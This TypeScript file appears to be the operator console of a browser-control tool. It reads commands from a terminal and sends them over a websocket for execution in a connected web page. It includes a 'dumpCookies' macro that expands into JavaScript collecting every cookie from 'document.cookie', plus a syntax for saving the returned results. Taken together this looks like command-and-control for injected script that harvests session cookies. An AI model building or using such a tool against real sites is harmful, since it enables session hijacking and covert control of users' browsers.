import readline from 'readline';

const rl = readline.createInterface({input: process.stdin, output: process.stdout});
const prompt = (query) => new Promise((resolve) => rl.question(query, resolve));

const fetchInput = async (doOnFetch: (res: string) => Promise<void>) => {
	const res = await prompt('>');
	await doOnFetch(res as string);
	await fetchInput(doOnFetch);
};

let shouldSave = false;
let saveTo = '';

export const handleQuery = (query: string, ws) => {
	if (query.includes('dumpCookies')) {
		query = query.replace('dumpCookies', ' document.cookie.split(\'; \').reduce((prev, current) => {const [name, ...value] = current.split(\'=\');prev[name] = value.join(\'=\');return prev;}, {});');
	}
	if (query.includes('|')) {
		shouldSave = true;
		saveTo = query.split('|')[1];
		ws.send(query.split('|')[0]);
	} else {
		if (query === 'clear') {
			console.clear();
		}
		ws.send(query);
		shouldSave = false;
		saveTo = '';
	}
};
